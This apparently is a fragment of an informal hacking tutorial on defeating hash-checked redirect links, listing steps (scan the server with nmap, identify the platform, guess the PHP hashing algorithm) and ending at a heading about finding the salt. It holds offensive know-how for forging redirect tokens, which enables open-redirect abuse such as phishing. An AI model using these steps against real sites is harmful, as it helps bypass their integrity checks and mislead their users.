http://www.hackerscreed.com/redrict.php?url=http://website.com&hash=1a3s4d8a4s6d21sad84sa6
and if the hasd and the url mismatches the request is rejected ! Fallow The steps to Defeat this 
mechanism.


- nmap Server
- figure out the platform used (php,asp)
- Ask google for "built in hasing algorithms in php v5"
- Ask google for "built in hasing libraries in php"
- Now compare the results and check which hasing algorithm is used !



__Defeating The Salted Hashes__

```
This time We have to find the salt which is added at the beginning or at the end of the hash
